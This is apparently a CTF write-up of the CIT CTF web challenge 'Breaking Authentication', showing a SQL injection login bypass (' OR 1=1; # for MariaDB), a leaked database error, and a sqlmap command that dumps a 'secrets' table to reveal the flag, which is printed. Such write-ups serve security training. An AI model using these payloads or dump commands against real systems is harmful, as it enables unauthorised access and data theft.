---
title: "Breaking Authentication"
date: 2025-04-27 14:30:00 +02:00
categories: [Writeup, CTF, Web]
tags: [CIT-CTF, security, web]
---
# Writeup - CIT CTF Challenge: Breaking Authentication

## 📋 Challenge Information
- **Name**: Breaking Authentication
- **Category**: Web
- **Description**: "Say my username."

---

## 🛠️ Solution

After visiting the site, I saw a standard login form.  
I decided to test for SQL Injection vulnerability.

I tried entering the following in the **username** field:
```plaintext
' OR 1=1; --
```
and any password.

![Screen logowania](/assets/img/CIT_CTF/login.png "Login screen")

I got an error about the syntax not being correct.
```plaintext
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--' AND password='1'' at line 1 in /var/www/html/index.php:23 Stack trace: #0 /var/www/html/index.php(23): mysqli->query('SELECT * FROM u...') #1 {main} thrown in /var/www/html/index.php on line 23
```
I found out that there is a MariaDB database on the server where the comment character is '#' and not '--'.

 tried again with the correction taken into account
```plaintext
' OR 1=1; #
```
![Screen Admin](/assets/img/CIT_CTF/admin.png "Admin Panel")

I managed to log in to the admin panel, but it turned out to be a dead-end road.

The description of chelleng indicates that it is about finding the name of the user for this purpose I used the **sqlmap** tool.

At first using sqlmap I learned that the name of the database is **app**, and then that there are two tables, **users** and **secrets** in it, so at first I dumped the content of secrets table.

```bash
sqlmap -u "http://23.179.17.40:58001/" --forms -D app -T secrets --dump   
```
And there the flag was located

```plaintext
Database: app
Table: secrets
[1 entry]
+--------+-----------------------+
| name   | value                 |
+--------+-----------------------+
| flag   | CIT{36b0efd6c2ec7132} |
+--------+-----------------------+  
```

---

## 🎴 Flag

```plaintext
CIT{36b0efd6c2ec7132}
```
---